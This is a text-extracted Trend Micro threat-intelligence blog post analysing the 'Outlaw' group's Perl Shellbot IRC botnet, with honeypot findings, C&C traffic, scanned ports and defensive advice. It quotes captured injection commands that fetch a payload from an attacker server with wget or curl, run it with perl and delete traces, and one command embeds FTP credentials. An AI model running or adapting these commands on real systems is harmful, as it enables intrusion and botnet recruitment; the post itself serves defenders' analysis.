@@ -1,0 +1,254 @@
+
+Trend
+ Micro 
+
+
+
+About
+ TrendLabs Security Intelligence Blog 
+
+
+
+Search:Goto…HomeCategoriesHome...Botnets... Perl-Based Shellbot Looks to Target Organizations via C&C 
+Perl-Based Shellbot Looks to Target Organizationsvia C&C 
+
+Posted on:November 1, 2018 
+at 12:04 am 
+
+Posted in:Botnets, Internet of Things, Malware 
+Author: 
+
+Trend Micro Cyber Safety Solutions Team 
+
+
+We uncovered an operation of a hacking group, which we’re naming “Outlaw” (translation derived from theRomanian word haiduc, the hacking tool the group primarily uses), involving the use of an IRC bot built withthe help of Perl Shellbot. The group distributes the bot by exploiting a common command injectionvulnerability on internet of things (IoT) devices and Linux servers. Further research indicates that the threatcan also affect Windows-based environments and even Android devices. 
+The threat actors in this recent activity compromised an FTP (File Transfer Protocol) server of a Japanese artinstitution, as well as a Bangladeshi government site over a vulnerability on Dovecot mail server. They thenused two compromised servers and linked them to a high availability cluster to host an IRC bouncer, whichwas used to command and control the emerging botnet. 
+Aside from .nding several exploit .les that allowed us to understand how the initial exploit on the .rst serverworked, we also found con.guration .les of the hackers’ toolset that allowed them to target organizationsthrough DoS and SSH brute force, using so-called “class .les.” Moreover, this suggests that the threat actorswere building a botnet that can be used for cybercriminal purposes. 
+The operation particularly caught our attention after various sensors of our honeypots started to capture newinjected commands: 
+Source Command 
+uname -a; wget hxxp://54[.]37[.]72[.]170/n3;
+107.1.153.75 curl -O hxxp://54[.]37[.]72[.]170/n3; perl n3;rm -rf n3; rm -rf n3.* uname -a; wget195.154.43.102 ftp://museum:museum04@153[.]122[.]156[.]2
+32/Mail/n3;.rm -rf n3; rm -rf n3.*uname -a; wget hxxp://54[.]37[.]72[.]170/n3;
+218.25.74.221 curl -O hxxp://54[.]37[.]72[.]170/n3; perl n3;
+rm -rf n3; rm -rf n3.*uname -a; wget hxxp://54[.]37[.]72[.]170/n3;
+61.8.73.166 curl -O hxxp://54[.]37[.]72[.]170/n3; perl n3;
+rm -rf n3; rm -rf n3.*uname -a; wget hxxp://54[.]37[.]72[.]170/n3;curl -O hxxp://54[.]37[.]72[.]170/n3; perl n3;
+61.8.73.166 rm -rf n3; rm -rf n3.*;wgethxxp://54[.]37[.]72[.]170/n.tgz;tar -xzvfn.tgz;rm -rf n.tgz;cd .s;./run;cd /tmp
+uname -a;cd /tmp;wget69.64.62.159 hxxp://54[.]37[.]72[.]170/n3;perl n3;rm -rfn3* 
+Table 1. Commands we identi.ed Note:.Source – Source IP address which tried to inject the command;Command – Command as captured by the honeypot sensor utility 
+Country
+Taiwan JapanUnited States India United KingdomIsrael Kuwait Brazil Colombia GermanySwitzerland Thailand BulgariaGreece ItalyMalaysia 
+Table 2. Countries with detections by endpoints(based on Trend Micro Smart Protection Network feedback) 
+The botnet itself is built with a Shellbot variant with script written in Perl and even available on GitHub. Thebotnet was previously distributed via an exploit of the Shellshock vulnerability, hence the name “Shellbot.”This time, the threat actors mostly distribute it via previously brute-forced or compromised hosts. 
+In order to look into the threat’s behavior, we looked into our honeypots with several hosts: 
+
+Host
+ #1: The Ubuntu 16.04 based host with Splunk forwarder for monitoring
+
+
+Host
+ #2: The Ubuntu 16.04 server with Dovecot mail server installed 
+
+
+Host
+ #3: An Android device running Android 7, one of the most popular versions and can be easilyrooted 
+
+
+We then monitored the C&C traf.c and obtained the IRC channels’ information. By the .rst infection, around142 hosts were present in the IRC channel. 
+How it infects systems 
+A command is .rst run on the IoT device or server. In this example, the command “uname -a;cd /tmp;wgethxxp://54[.]37[.]72[.]170/n3;perl n3;rm -rf n3*” veri.es that the host accepts commands from thecommand-line interface (CLI) with “uname -a“. Once the command runs successfully, the working directory is changed to “/tmp“. The downloaded payload, n3 .le (detected by Trend Micro as PERL_SHELLBOT.SM),is then consequently run with perl interpreter. In the .nal step of the chain, the n3 .le is removed, with notrace of activity left on the attacked system. 
+Figure 1. Actual payload, with .lename n3 Once the bot is installed, it starts to communicate with one of the C&C servers via IRC. 
+Figure 2. The bot runs as “/usr/sbin/httpd” 
+Figure 3. Outgoing connection to one of the C&C servers, luci[.]madweb[.]ro 
+The C&C connection attempt occurs right after the infection and is persistent. In case of lost connectivity, itimmediately reconnects once an internet connection is available. At this stage, restarting the infected machinewon’t revert the changes done to the system. 
+To understand the dynamics of the C&C communication better, we also captured the traf.c of the infectedhosts. Reconstructed Transmission Control Protocol (TCP) streams show in clear text the download of themalicious .le and subsequent communication with the C&C servers. 
+
+Captured network traf.c during the infection 
+A TCP stream from traf.c capture between the infected host and C&C server at the time of the infectionbelow shows that the n3 .le was consequently downloaded and run on the target system. 
+Figure 4. TCP stream from network traf.c between the infected host and C&C server 
+Figure 5. TCP communication stream after the infection 
+After the infection, the communication shows that it joined the bot’s IRC channel and assigned nickname andserver con.guration information. Modifying Domain Name System (DNS) settings should show and con.rmthat a real target is involved (not just the honeypot) and that it has visibility to the internet. It also shows thenumber of processor cores and the type of processor. It also discloses that the Splunk is running on the hostby using the command “cat /etc/passwd/” with .ltered output. This is to notify the admins that the targetdevice is being monitored or if it has an antivirus (AV) solution installed. 
+It is followed by PING/PONG communication (where the IRC server occasionally sends a PING message,which requires the response of a PONG message to prevent getting disconnected) to keep the communicationchannel open. 
+Figure 6. Separate information are sent to IRC admins 
+There is a list of hardcoded process names Shellbot is assigned when run. These help hide the running botfrom system admins, security monitoring, and researchers. 
+Figure 7. Screenshot from Shellbot’s con.guration .le with the available process names 
+Once the Shellbot is running on a target system, the administrator of the IRC channel can send variouscommands to the host. The list includes commands to perform a port scan, perform various forms ofdistributed denial of service (DDoS), download a .le, get information about other machines, or just send theoperating system (OS) information and list of certain running processes on the C&C server. 
+
+Possible script functions an IRC command can call 
+Figure 8. Screenshot of script header with list of available commands 
+Some of the IRC-related functions seen to have been used were join, part, uejoin, op, deop, voice, devoice,nick, msg, quit, uaw, and die. DDoS-related activity affects User Data Protocol (UDP), TCP, and HTTP traf.c. 
+If a port scan is invoked, the bot always scans the following ports: 
+Ports 
+1  7  9  14  20  21  22  23  25  53  
+80  88  110  112  113  137  143  145  222  333  
+405  443  444  445  512  587  616  666  993  995  
+1024  1025  1080  1144  1156  1222  1230  1337  1348  1628  
+1641  1720  1723  1763  1983  1984  1985  1987  1988  1990  
+1994  2005  2020  2121  2200  2222  2223  2345  2360  2500  
+2727  3130  3128  3137  3129  3303  3306  3333  3389  4000  
+4001  4471  4877  5252  5522  5553  5554  5642  5777  5800  
+5801  5900  5901  6062  6550  6522  6600  6622  6662  6665  
+6666  6667  6969  7000  7979  8008  8080  8081  8082  8181  
+8246  8443  8520  8787  8855  8880  8989  9855  9865  9997  
+9999  10000  10001  10010  10222  11170  11306  11444  12241  12312  
+14534  14568  15951  17272  19635  19906  19900  20000  21412  21443  
+21205  22022  30999  31336  31337  32768  33180  35651  36666  37998  
+41114  41215  44544  45055  45555  45678  51114  51247  51234  55066  
+55555  65114  65156  65120  65410  65500  65501  65523  65533  
+
+Table 3. Ports scanned by the bot 
+
+Sample of network communication captured on infected hosts 
+This network communication seems to be the output of an XMR rig mining monitoring tool. 
+Code of the tool: 
+root@ubuntu:~$ cat speed.shi=1 result=`docker ps -q | wc -l`while [ “$i” -le “$result” ]do echo “miner numa $i speed”docker logs minernuma$i | tail -8 | grep speed >> /tmp/minernuma$i.tmp 
+tail -1 /tmp/minernuma$i.tmprm /tmp/minernuma$i.tmpi=$(($i + 1))done 
+
+Reconstructed TCP streams from the traf.c capture of C&C commands 
+The infected host always gets assigned a nickname of “sEx” along with a randomly generated integer. In this example, the host nickname is “sEx-3635”. 
+Figure 9. TCP stream with a sample host nickname 
+All infected hosts also showed base C&C connection in the form of PING/PONG traf.c, occasionally askedfor updates, and provided some host information like suspicious crontab-like records and process identi.er(PID) of the sd-pam process of the user who was running the IRC bot on the system. The following is theinformation exchange about a host, possibly the bot’s new joiner or another target indirectly scanned over thezombie hosts, the infected host in this case: During the traf.c monitoring, several identities such as luci, lucian, dragos, mazy, hydra, and poseidon were spotted in IRC communication channels. 
+Figure 10. Host information exchange TCP stream 
+Figure 11. One of the spotted identities linked to compromised servers 
+These identities were also found as usernames on a compromised Japanese server. This server seemed to havea certain importance as it was also used to distribute an early version of this N3-Shellbot. The distribution of the dropper, n3 .le, was done mostly on the second C&C server. Communication with this server is shown inthe following example: 
+Figure 12. Dragos SSH login 
+
+Using the credentials from one of the commands injected into the honeypots, we were able to get downloadsof the .les that the threat actors used. The .les’ contents often changed on the server (some were deleted,while some were added). According to the time correlation, it mostly happened in the daytime (in CentralEuropean Time/CET): during business hours and times. The activity never happened at night or on theweekends, suggesting that the threat actors operated on a somewhat daily basis. 
+Find a more extensive run-through of this operation, such as how the IRC bouncer involved comments in theRomanian language, the hacking tools used, exploits related to Ubuntu, and the indicators of compromise(IoCs), in the Appendix. 
+
+Preventing compromise from malicious bot-related activities 
+The Outlaw group here used an IRC bot, which isn’t a novel threat. The code used is available online, makingit possible to build such a bot (with a fully undetectable toolset) and operate it under the radar of commonnetwork security solutions. Additionally, in this particular operation, it should be noted that the attackerslooked into targeting big companies. While we haven’t seen widespread attacks from this hacking group, it isimportant to adopt security measures that can defend systems against any potential attacks, such as: 
+
+Setting
+ up the SSH login process properly. Do not leave it open to public networks unless it isnecessary for your infrastructure. Many devices run an SSH service by default, unnecessarily, withdefault credentials. This is particularly true in the case of network infrastructure devices like switchesand .rewalls. 
+
+
+Monitoring
+ the commands used on CLI on your systems.
+
+
+Monitoring
+ non-DNS traf.c coming to and from port 53.
+
+
+Detecting
+ creation of new accounts and regularly verifying that all created accounts are only used forbusiness purposes.
+
+
+Restricting
+ the use of FTP as much as possible. Not only does it transfer passwords in clear text, but isalso usually used for loading the exploit .les on local systems. The same goes for the web directories.Any newly created .les should be considered suspicious unless they are in an intended folder in thesystem.
+
+
+Reconsidering
+ the use of Dovecot mail server, as it has been found to have a buffer over.owvulnerability (and therefore unsecure). Patch it or at least monitor its .le directory for unusual .les.
+
+
+Maintaining
+ a mailbox, a contact person, or at least a contact form on your website for reporting anypossible abuse or security compromise. 
+
+
+Users can also consider adopting security solutions that can provide protection from malicious bot-relatedactivities through a cross-generational blend of threat defense techniques. Trend Micro. XGen. security 
+provides high-.delity machine learning that can secure the gateway and endpoints, and protect physical,virtual, and cloud workloads. With technologies that employ web/URL .ltering, behavioral analysis, andcustom sandboxing, XGen security offers protection against ever-changing threats that bypass traditionalcontrols and exploit known and unknown vulnerabilities. XGen security also powers Trend Micro’s suite ofsecurity solutions: Hybrid Cloud Security, User Protection, and Network Defense. 
+
+Related Posts: 
+
+Keeping a Hidden Identity: Mirai C&Cs in Tor Network 
+
+
+Learn how to protect Enterprises, Small Businesses, and Home Users from ransomware: 
+ENTERPRISE 
+. SMALL BUSINESS 
+. HOME 
+. 
+Tags: androidIOTIRC botLinuxWindows 
+
+Security Predictions for 2020 
+
+Cybersecurity in 2020 will be viewed through many lenses — from differing attacker motivations andcybercriminal arsenal to technological developments and global threat intelligence — only sodefenders can keep up with the broad range of threats.
+Read our security predictions for 2020. 
+
+
+Business Process Compromise 
+
+Attackers are starting to invest in long-term operations that target speci.c processes enterprises rely on.They scout for vulnerable practices, susceptible systems and operational loopholes that they canleverage or abuse. To learn more, read our Security 101: Business Process Compromise. 
+
+
+Recent Posts 
+
+New
+ MacOS Dacls RAT Backdoor Show Lazarus’ Multi-Platform Attack Capability
+
+
+Targeted
+ Ransomware Attack Hits Taiwanese Organizations
+
+
+WebMonitor
+ RAT Bundled with Zoom Installer 
+
+
+
+Exposed
+ Redis Instances Abused for Remote Code Execution, Cryptocurrency Mining
+
+
+Grouping
+ Linux IoT Malware Samples With Trend Micro ELF Hash 
+
+
+
+
+Popular Posts 
+WebMonitor RAT Bundled with Zoom Installer 
+
+New MacOS Dacls RAT Backdoor Show Lazarus’ Multi-Platform Attack Capability 
+
+Exposing Modular Adware: How DealPly, IsErIk, and ManageX Persist in Systems 
+
+Coronavirus Update App Leads to Project Spy Android and iOS Spyware 
+
+Dissecting Geost: Exposing the Anatomy of the Android Trojan Targeting Russian Banks 
+
+
+Stay Updated 
+Home and Home Of.ce 
+YouremailhereSubscribe
+|
+
+For Business 
+
+
+|
+
+
+Security Intelligence
+
+|
+
+
+About Trend Micro 
+
+
+Asia Paci.c Region (APAC): Australia / New Zealand, 中国, .本, ...., 台灣 
+
+
+Latin America Region (LAR): Brasil, México 
+
+
+North America Region (NABU): United States, Canada 
+
+
+
+Europe, Middle East, & Africa Region (EMEA): France, Deutschland / .sterreich / Schweiz, Italia,Россия, Espa.a, United Kingdom / Ireland 
+
+
+Privacy Statement
+
+Legal Policies 
+
+
+Copyright . 2020 Trend Micro Incorporated. All rights reserved. 
+
+
+
+
